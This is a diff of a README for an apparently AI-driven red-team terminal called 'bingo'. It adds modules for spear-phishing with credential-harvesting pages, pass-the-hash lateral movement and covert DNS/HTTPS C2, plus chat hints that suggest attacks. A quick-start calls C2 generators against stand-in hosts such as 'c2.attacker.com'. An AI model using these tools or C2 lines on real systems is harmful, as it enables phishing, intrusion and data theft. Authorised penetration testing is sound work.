@@ -6,7 +6,7 @@
 
 **The #1 AI-Powered Red Team Terminal**
 
-[![Version](https://img.shields.io/badge/version-3.5.20-brightgreen)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-3.5.21-brightgreen)](https://github.com/bingook/bingo/releases)
 [![Python](https://img.shields.io/badge/python-3.12%20%7C%203.13-blue)](https://python.org)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 [![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
@@ -1317,6 +1317,68 @@ When AI coding agents (Claude Code, GitHub Copilot, Gemini CLI) run inside GitHu
 
 ---
 
+## New in v3.5.21 — Full APT-ification: AI Phishing · Supply Chain · Lateral Movement · Covert C2
+
+> **v3.5.21** introduces four APT-grade offensive modules under a unified `/apt` slash command, with automatic chat-mode detection and multilingual (KO/ZH/EN) hints.
+
+### APT Module Overview
+
+| Module | Command | Description |
+|---|---|---|
+| AI Spear-Phishing | `/apt phish <email> [lure]` | OSINT profiling → personalised spear-phishing email + HTML credential harvesting page + GoPhish config |
+| Supply Chain Scanner | `/apt supply <path>` | npm/pip/GitHub Actions dependency scan — Dependency Confusion, Typosquatting, malicious-package IOC lookup |
+| Lateral Movement | `/apt lateral <ip> [user] [hash]` | Impacket/CrackMapExec/SSH/BloodHound/PTH/PTT command auto-generation |
+| Covert C2 Channel | `/apt c2 <host> [dns\|https\|both]` | DNS-tunnelling C2 (base32/TXT) + HTTPS Beacon C2 (AES-256-CBC, Jitter, Domain Fronting) |
+
+### New files
+
+```
+bingo/core/apt/__init__.py
+bingo/core/apt/phishing.py        # Module 1 — AI spear-phishing
+bingo/core/apt/supply_chain.py    # Module 2 — supply chain vuln scanner
+bingo/core/apt/lateral_movement.py# Module 3 — internal network lateral movement
+bingo/core/apt/c2_channel.py      # Module 4 — covert C2 channel generator
+```
+
+### Quick Start
+
+```python
+# Spear-phishing
+from bingo.core.apt.phishing import quick_phish
+result = quick_phish("ceo@target.com", lure="invoice")
+print(result.subject, result.body)
+
+# Supply chain scan
+from bingo.core.apt.supply_chain import SupplyChainScanner
+findings = SupplyChainScanner("./package.json").scan()
+
+# Lateral movement commands
+from bingo.core.apt.lateral_movement import quick_lateral_commands
+cmds = quick_lateral_commands("10.0.0.5", username="admin", password="hash123")
+
+# Covert C2 — DNS tunnel
+from bingo.core.apt.c2_channel import CovertC2
+c2 = CovertC2("c2.attacker.com"); print(c2.generate_dns_client())
+
+# Covert C2 — HTTPS Beacon
+c2 = CovertC2("cdn.attacker.com"); print(c2.generate_https_client())
+```
+
+### Chat-mode auto-detection (v3.5.21)
+
+After every command execution bingo scans output for APT context and injects contextual hints:
+
+| Detected pattern | Auto-hint |
+|---|---|
+| Private IP / SMB / RPC / LDAP | `🔀 Internal network detected — /apt lateral <IP>` |
+| `package.json` / `requirements.txt` / `.github/workflows` | `⛓️ Supply chain file detected — /apt supply <path>` |
+| Email address / LinkedIn / OSINT | `🎣 Phishing context detected — /apt phish <email>` |
+| C2 / beacon / callback / tunnel | `🕵️ C2 context detected — /apt c2 <host>` |
+
+> All modules generate commands/scripts only. No live attacks are executed without explicit user action. Use in authorised red team / penetration test environments only.
+
+---
+
 ## New in v3.5.20 — 0day Hunter: 5 Real-World 0day/N-day Exploits Integrated
 
 > **v3.5.20** extends 0day Hunter with five research-grade vulnerability modules that activate automatically in chat mode.
@@ -1872,6 +1934,7 @@ No manual configuration needed — activates silently and retries.
 
 | Version | Summary |
 |---------|---------|
+| v3.5.21 | **Full APT-ification** — 4 new APT modules (`bingo/core/apt/`): AI spear-phishing generator (OSINT profiling, HTML lure page, GoPhish config), supply chain vuln scanner (npm/pip/GitHub Actions, Dependency Confusion, Typosquatting, malicious-pkg IOC), internal-network lateral movement (Impacket/CME/SSH/BloodHound/PTH/PTT command gen), covert C2 channel (DNS-tunnel base32/TXT + HTTPS Beacon AES-256-CBC + Jitter + Domain Fronting); `/apt` slash command; chat-mode auto-detection for all 4 contexts; 17 new multilingual i18n keys (KO/ZH/EN) |
 | v3.5.20 | **0day Hunter v2** — 5 research-grade 0day/N-day exploit modules: CVE-2024-41713 / CVE-2024-35286 / 0day-LFI (Mitel MiCollab), CVE-2024-20017 (MediaTek wappd UDP overflow), CVE-2023-4863 (libwebp BLASTPASS heap overflow), CVE-2023-4911 (glibc Looney Tunables LPE), CVE-2024-43035 / CVE-2024-48946 / CVE-2024-9301 (ZeroPath IDOR/RCE/Traversal); 4 new `bingo/core/exploits/` PoC modules; auto exploit-module hint injection in chat mode; 8 new multilingual i18n keys (KO/ZH/EN) |
 | v3.5.19 | **0day Hunter** — Dir-1 Detection (version fingerprinting + 33 error patterns), Dir-2 Exploitation (per-class PoC payload hints + auto code generation), Dir-3 Utilization (local CVE DB for 35 software × known versions + live NVD API lookup, Shodan fallback hint); activates automatically in every chat execution output; 7 new multilingual i18n keys (KO/ZH/EN); new `bingo/core/zeroday.py` |
 | v3.5.18 | macOS VPN banner wording fix (auto-resolve timing accuracy) |
@@ -1987,7 +2050,7 @@ MIT © 2026 bingook
 
 *The only AI pentest terminal with built-in engines, HTTP smuggling, anti-hallucination guard, role-based testing, vuln manager, target memory, and LLM Orchestrator.*
 
-[![Version](https://img.shields.io/badge/version-3.5.20-brightgreen)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-3.5.21-brightgreen)](https://github.com/bingook/bingo/releases)
 [![PyPI](https://img.shields.io/pypi/v/bingo-ai.svg)](https://pypi.org/project/bingo-ai/)
 
 </div>
